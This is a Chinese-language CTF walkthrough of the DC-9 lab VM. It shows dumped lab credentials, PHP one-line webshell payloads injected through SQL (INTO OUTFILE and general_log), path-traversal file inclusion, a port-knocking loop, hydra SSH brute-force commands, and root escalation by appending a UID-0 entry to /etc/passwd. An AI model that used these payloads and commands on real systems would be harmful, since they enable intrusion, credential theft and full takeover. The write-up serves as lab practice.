| 8  | bettyr    | Rubble     | 2019-12-29 16:58:26 | BamBam01      | Betty     |
| 9  | chandlerb | Bing       | 2019-12-29 16:58:26 | UrAG0D!       | Chandler  |
| 10 | joeyt     | Tribbiani  | 2019-12-29 16:58:26 | Passw0rd      | Joey      |
| 11 | rachelg   | Green      | 2019-12-29 16:58:26 | yN72#dsd      | Rachel    |
| 12 | rossg     | Geller     | 2019-12-29 16:58:26 | ILoveRachel   | Ross      |
| 13 | monicag   | Geller     | 2019-12-29 16:58:26 | 3248dsds7s    | Monica    |
| 14 | phoebeb   | Buffay     | 2019-12-29 16:58:26 | smellycats    | Phoebe    |
| 15 | scoots    | McScoots   | 2019-12-29 16:58:26 | YR3BVxxxw87   | Scooter   |
| 16 | janitor   | Trump      | 2019-12-29 16:58:26 | Ilovepeepee   | Donald    |
| 17 | janitor2  | Morrison   | 2019-12-29 16:58:28 | Hawaii-Five-0 | Scott     |
+----+-----------+------------+---------------------+---------------+-----------+
```

另外一个表发现admin的hash密码

```
+--------+----------+----------------------------------+
| UserID | Username | Password                         |
+--------+----------+----------------------------------+
| 1      | admin    | 856f5de590ef37314e7c3bdf6f8a66dc |
+--------+----------+----------------------------------+
```

admin:transorbital1

![image-20230905112629348](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309051126554.webp)

登录admin

![image-20230905112717690](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309051127914.webp)

尝试在添加用户那里写shell

让它报错可以看到执行的sql语句

![image-20230905113617853](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309051136068.webp)





```
select @@basedir;查网站的物理路径
/usr

查看数据库是否有导入权限，看能否直接导入木马
SHOW GLOBAL VARIABLES LIKE '%secure%'
有的话直接写入
select '<?php @eval($_POST[a]);?>'INTO OUTFILE '/home/wwwroot/default/p.php'

如果没有，查看是否有开启日志记录
SHOW GLOBAL VARIABLES LIKE ‘%general%’
日志记录功能关闭，但是可以开启
SET GLOBAL general_log = ON
SET GLOBAL general_log_file = 'C:/phpstudy/WWW/test.php'
select '<?php eval ($_POST[hack]);?>'
执行这条语句之后，日志会将select后的查询语句记录进日志，从而让日志变成一个一句话木马
```

select '<?php @eval($_POST[a]);?>'INTO OUTFILE '/home/wwwroot/default/p.php'

在position位置注入

'3','4','5') union select '<?php @eval($_POST[a]);?>'INTO OUTFILE '/usr/1.php'-- -

但是好像不行



看了wp说是这里有一个file，下面这里提示我们有文件包含漏洞

![image-20230905120422718](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309051204048.webp)

![image-20230905121144076](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309051211379.webp)

尝试日志文件包含反弹shell,也是没找到日志文件放哪里了，可能更改了吧

尝试爆破ssh，因为etc/passwd里有几个之前sqlmap跑出来的账号

但是ssh状态为filtered，有可能是被防火墙过滤了

看一下配置

?file=../../../../etc/knockd.conf

![image-20230905123537113](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309051235331.webp)

`/etc/knockd.conf`

这个讲的很好https://blog.csdn.net/nzjdsds/article/details/112476120

```
用于配置 Knockd 服务。Knockd 是一个基于端口混淆的工具，旨在提高系统的安全性。它允许用户使用预定义的网络端口序列触发特定的操作，如打开/关闭端口、执行命令等。

敲门：for x in 7469 8475 9842;do nmap -Pn --max-retries 0 -p $x 192.168.111.10;done
```

敲门结束后再探测22端口就是open状态了

![image-20230905123643928](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309051236151.webp)



hydra爆破ssh

```
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh
hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh
hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh
hydra -l root -P password.txt 192.168.1.111 ssh
```

```
+----+-----------+------------+---------------------+---------------+-----------+
| id | username  | lastname   | reg_date            | password      | firstname |
+----+-----------+------------+---------------------+---------------+-----------+
| 1  | marym     | Moe        | 2019-12-29 16:58:26 | 3kfs86sfd     | Mary      |
| 2  | julied    | Dooley     | 2019-12-29 16:58:26 | 468sfdfsd2    | Julie     |
| 3  | fredf     | Flintstone | 2019-12-29 16:58:26 | 4sfd87sfd1    | Fred      |
| 4  | barneyr   | Rubble     | 2019-12-29 16:58:26 | RocksOff      | Barney    |
| 5  | tomc      | Cat        | 2019-12-29 16:58:26 | TC&TheBoyz    | Tom       |
| 6  | jerrym    | Mouse      | 2019-12-29 16:58:26 | B8m#48sd      | Jerry     |
| 7  | wilmaf    | Flintstone | 2019-12-29 16:58:26 | Pebbles       | Wilma     |
| 8  | bettyr    | Rubble     | 2019-12-29 16:58:26 | BamBam01      | Betty     |
| 9  | chandlerb | Bing       | 2019-12-29 16:58:26 | UrAG0D!       | Chandler  |
| 10 | joeyt     | Tribbiani  | 2019-12-29 16:58:26 | Passw0rd      | Joey      |
| 11 | rachelg   | Green      | 2019-12-29 16:58:26 | yN72#dsd      | Rachel    |
| 12 | rossg     | Geller     | 2019-12-29 16:58:26 | ILoveRachel   | Ross      |
| 13 | monicag   | Geller     | 2019-12-29 16:58:26 | 3248dsds7s    | Monica    |
| 14 | phoebeb   | Buffay     | 2019-12-29 16:58:26 | smellycats    | Phoebe    |
| 15 | scoots    | McScoots   | 2019-12-29 16:58:26 | YR3BVxxxw87   | Scooter   |
| 16 | janitor   | Trump      | 2019-12-29 16:58:26 | Ilovepeepee   | Donald    |
| 17 | janitor2  | Morrison   | 2019-12-29 16:58:28 | Hawaii-Five-0 | Scott     |
+----+-----------+------------+---------------------+---------------+-----------+
```

![image-20230905124153110](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309051241339.webp)



dc9user.txt

```
marym
julied
fredf
barneyr
tomc
jerrym
wilmaf
bettyr
chandlerb
joeyt
rachelg
rossg
monicag
phoebeb
scoots
janitor
janitor2
```

dc9pass.txt

```
3kfs86sfd
468sfdfsd2
4sfd87sfd1
RocksOff
TC&TheBoyz
B8m#48sd
Pebbles
BamBam01
UrAG0D!
Passw0rd
yN72#dsd
ILoveRachel
3248dsds7s
smellycats
YR3BVxxxw87
Ilovepeepee
Hawaii-Five-0
```

将账号密码放入爆破
```
hydra -L dc9user.txt -P dc9pass.txt 192.168.1.14 ssh
```

爆出三个账号

login: chandlerb  password: UrAG0D!

login: joeyt  password: Passw0rd

login: janitor  password: Ilovepeepee



接下来涉及到翻找各种用户，sudo -l找到了一个root权限的脚本可以把一个文件的内容写入另一个文件，就可以尝试写/etc/passwd添加root用户了

`/etc/passwd`

```
/etc/passwd中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段，其格式和具体含义如下：
root:x:0:0:root:/root:/bin/bash
用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell

第一个参数（root）：用户名称。
第二个参数（x）：密码。x代表有密码，密码存储在/etc/shadow文件中。若此参数为空，则代表不用密码就可以登录此用户。
第三个参数（0）：用户ID（UID）。0：超级用户 UID。1~499：系统用户UID。500 ~ 65535：普通用户 UID。
第四个参数（0）：用户组ID（GID）。
第五个参数 （root）:用户的简单说明。可为空。
第六个参数（/root）：用户家目录。用户登录后具有操作权限的访问目录。
第七个参数（/bin/bash）：用户登录shell。/bin/bash为可登录系统的shell，/sbin/nologin为禁止登录的shell（很多系统用户为禁止登录shell）。

所有用户都可读，只有root用户可写
```

写入/etc/passwd

```
使用openssl passwd -1 生成加密的密码：-1表示使用MD5算法对密码redhat进行加密
openssl passwd -1 -salt demon 123456
echo 'demon:$1$demon$Mspg7FhbFwGLZ4T2s/qI6/:0:0:root:/bin/bash' >> /etc/passwd
```













































